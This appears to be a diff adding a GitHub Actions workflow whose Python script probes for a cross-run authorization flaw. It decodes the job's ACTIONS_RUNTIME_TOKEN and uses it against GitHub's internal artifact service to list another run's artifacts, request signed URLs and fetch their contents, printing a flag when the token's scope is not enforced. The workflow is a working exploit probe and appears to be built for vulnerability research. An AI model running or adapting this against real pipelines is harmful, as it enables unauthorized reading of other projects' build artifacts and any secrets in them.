@@ -1,0 +1,88 @@
+name: probe_v77_results_consumer
+on:
+  workflow_dispatch:
+    inputs:
+      run_bid:
+        description: producer workflow_run_backend_id
+        required: true
+      job_bid:
+        description: producer workflow_job_run_backend_id
+        required: true
+      prod_results_url:
+        description: producer ACTIONS_RESULTS_URL (optional; defaults to own host)
+        required: false
+        default: ''
+jobs:
+  consume:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: cross-run-artifact-read
+        continue-on-error: true
+        env:
+          IN_RUN_BID: ${{ github.event.inputs.run_bid }}
+          IN_JOB_BID: ${{ github.event.inputs.job_bid }}
+          IN_PROD_RU: ${{ github.event.inputs.prod_results_url }}
+        run: |
+          python3 - <<'PYEOF'
+          import os, base64, json, re, urllib.request, urllib.error
+          def b64ud(x):
+              x += '=' * (-len(x) % 4); return base64.urlsafe_b64decode(x.encode())
+          rt = os.environ['ACTIONS_RUNTIME_TOKEN']
+          own_ru = os.environ.get('ACTIONS_RESULTS_URL','').rstrip('/')
+          prod_ru = (os.environ.get('IN_PROD_RU','') or '').rstrip('/')
+          run_bid = os.environ['IN_RUN_BID'].strip()
+          job_bid = os.environ['IN_JOB_BID'].strip()
+
+          myscp = json.loads(b64ud(rt.split('.')[1])).get('scp','')
+          print('MARK MY_SCP=%s' % myscp)
+          m = re.search(r'Actions\.Results:([0-9a-fA-F-]+):([0-9a-fA-F-]+)', myscp)
+          own_run, own_job = (m.group(1), m.group(2)) if m else (None, None)
+          print('MARK MY_RUN_BID=%s MY_JOB_BID=%s' % (own_run, own_job))
+          print('MARK PRODUCER_RUN_BID=%s JOB_BID=%s' % (run_bid, job_bid))
+          print('MARK OWN_RESULTS_URL=%s PROD_RESULTS_URL=%s' % (own_ru, prod_ru or '(same)'))
+
+          def twirp(host, method, body):
+              url = '%s/twirp/github.actions.results.api.v1.ArtifactService/%s' % (host, method)
+              r = urllib.request.Request(url, data=json.dumps(body).encode(), method='POST')
+              r.add_header('Authorization','Bearer ' + rt); r.add_header('Content-Type','application/json')
+              try:
+                  resp = urllib.request.urlopen(r, timeout=20); return resp.status, resp.read(1200).decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read(500).decode('utf-8','replace')
+              except Exception as e:
+                  return 'ERR', str(e)[:140]
+
+          # ---- POSITIVE CONTROL: list OWN run's artifacts (proves the harness/proto works) ----
+          if own_run:
+              st, b = twirp(own_ru, 'ListArtifacts', {'workflow_run_backend_id':own_run,'workflow_job_run_backend_id':own_job})
+              print('MARK CONTROL_LIST_OWN -> %s | %s' % (st, b[:200].replace(chr(10),' ')))
+
+          # ---- TEST: list PRODUCER's artifacts with OUR token (scp covers a DIFFERENT run) ----
+          hosts = [('OWN_HOST', own_ru)]
+          if prod_ru and prod_ru != own_ru: hosts.append(('PROD_HOST', prod_ru))
+          for label, host in hosts:
+              if not host: continue
+              st, b = twirp(host, 'ListArtifacts', {'workflow_run_backend_id':run_bid,'workflow_job_run_backend_id':job_bid})
+              cross = isinstance(st,int) and 200 <= st < 300 and 'artifact' in b.lower() and '"artifacts":[]' not in b.replace(' ','')
+              flag = ' <<< CROSS-RUN READ (scp NOT enforced)' if cross else ''
+              print('MARK TEST_LIST_PRODUCER[%s] -> %s%s | %s' % (label, st, flag, b[:260].replace(chr(10),' ')))
+              if cross:
+                  try:
+                      for a in json.loads(b).get('artifacts',[])[:2]:
+                          nm = a.get('name')
+                          ds, db = twirp(host, 'GetSignedArtifactURL',
+                                         {'workflow_run_backend_id':run_bid,'workflow_job_run_backend_id':job_bid,'name':nm})
+                          print('MARK SIGNEDURL[%s name=%s] -> %s | %s' % (label, nm, ds, db[:160].replace(chr(10),' ')))
+                          um = re.search(r'https?://[^"\\ ]+', db)
+                          if um:
+                              try:
+                                  data = urllib.request.urlopen(um.group(0), timeout=20).read(300).decode('utf-8','replace')
+                                  print('MARK CANARY_FETCH[%s]=%s' % (label, data.replace(chr(10),' ')))
+                              except Exception as e:
+                                  print('MARK CANARY_FETCH_ERR=%s' % str(e)[:120])
+                  except Exception as e:
+                      print('MARK PARSE_ERR=%s' % str(e)[:120])
+          print('MARK DONE')
+          PYEOF
